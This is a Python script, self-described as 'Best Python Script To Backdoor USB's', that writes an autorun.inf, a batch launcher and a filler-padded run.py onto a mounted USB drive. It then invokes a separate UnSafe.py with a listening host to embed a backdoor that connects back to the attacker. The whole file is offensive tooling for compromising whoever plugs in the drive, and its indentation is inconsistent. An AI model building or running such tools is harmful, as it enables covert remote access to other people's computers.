#!/usr/bin/env python
try:
    import os, time, sys, argparse
    def cli():
        global args
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--usb', help="USB To inject Backdoor to. USB Needs to be mounted!\nHow to mount USB: pmount /dev/sdc1")
        parser.add_argument('-l', '--lhost', help="Listen HOST For the backdoor\nE.G.: 192.168.1.3\nNOTE: The Server file will be generated in the 'Un-Safe' directory.")
        args = parser.parse_args()
    def print_red(msg):
        print(bcolors.FAIL + msg + bcolors.ENDC)
    def print_yellow(text):
        print(bcolors.WARNING + text + bcolors.ENDC)
    def print_green(txt):
        print(bcolors.OKGREEN + txt + bcolors.ENDC)
    def print_blue(text):
        print(bcolors.OKBLUE + text + bcolors.ENDC)
    class bcolors:
        HEADER = '\033[95m'
        OKBLUE = '\033[94m'
        OKGREEN = '\033[92m'
        WARNING = '\033[93m'
        FAIL = '\033[91m'
        ENDC = '\033[0m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'
    class welcome:
        def __init__(self):
            pass
        @classmethod
        def hello(self):
            print_yellow("""             
            ____________   _   _ ___________ 
            | ___ \  _  \ | | | /  ___| ___ \\
            | |_/ / | | | | | | \ `--.| |_/ / 
            | ___ \ | | | | | | |`--. \ ___ \\
            | |_/ / |/ /  | |_| /\__/ / |_/ /
            \____/|___/    \___/\____/\____/ 
                                     
                                    
    """)
	    print_blue("	    Welcome To BD USB! \n	    Best Python Script To Backdoor USB's!\n	    Have Fun and stay Legal!")
	    print_red("""
	    Original Software made by NSK B3
	    Youtube:""")
	    print_yellow("	    Nerkzei")
	    print_red("	    Business Email:")
	    print_yellow("    	    nskb3business@protonmail.com")
	    print_red("   	    Have Fun!")
	    time.sleep(3)
	    print_green("	    Starting UnSafe.py...")
	    
	    time.sleep(1.3)
    def inject_backdoor():
        autorun = """
[autorun]
open=run.bat 
icon=run-bat,1
"""
	run = open(str(args.usb) + "/run.py", "w")
	run.write('''
print("LOADING DON'T EXIT...")
##da33l4d;
#<cs
#5g
#rge5
#ee
#tvg
#4g5g
#34v
#t4t
#t3
#t3v4
#t
#34tv3
#v43t
#34vt
#t34
#t4v3
#43cvt
#v43t
#34vt
#t34
#t4v3
#43cvt
#cv4
##
#4v
#g5
##gg5>
#g5
#>d>,;
#wf;vt5
#43t@;#v43t
#34vt
#t34
#t4v3
#43cvt
#cv4
##
#4v
#g5
##gg5>
#g5
#>d>,;
#wf;vt5
#43t@;
#v43t
#34vt
#t34
#t4v3
#43cvt
#cv4
##
#4v
#g5
##gg5>
#g5
#>d>,;
#wf;vt5
#43t@;#v43t
#34vt
#t34
#t4v3
#43cvt
#cv4
##
#4v
#g5
##gg5>
#g5
#>d>,;
#wf;vt5
#43t@;

#v43t
#34vt
#t34
#t4v3
#43cvt
#cv4
##
#4v
#g5
##gg5>
#g5
#>d>,;
#wf;vt5
#43t@;
#v43t
#34vt
#t34
#t4v3
#43cvt
#cv4
##
#4v
#g5
##gg5>
#g5
#>d>,;
#wf;vt5
#43t@;
#cv4
##
#4v
#g5
##gg5>
#g5
#>d>,;
#wf;vt5
#43t@;
#trgd v
#434t3
#43r
#v@ew
#3v
#34 v
#3fsd
#dfg345t
#3535gg
#534f''')
	file = open(str(args.usb) + "/run.bat", "w")
	file.write('''
@echo off
python run.py''')
        f = open(str(args.usb) + "/autorun.inf", "w")
        f.write(autorun)
        os.chdir('Un-Safe')
        os.system("python UnSafe.py %s/run.py %s" % (str(args.usb), str(args.lhost)))
    def run():
        welcome.hello()
        cli()
        inject_backdoor()
    if __name__ == '__main__':
        run()
except KeyboardInterrupt:
	print("Interrupted by the user.")
except Exception as e:
    print_red("An error occured, " + str(e))

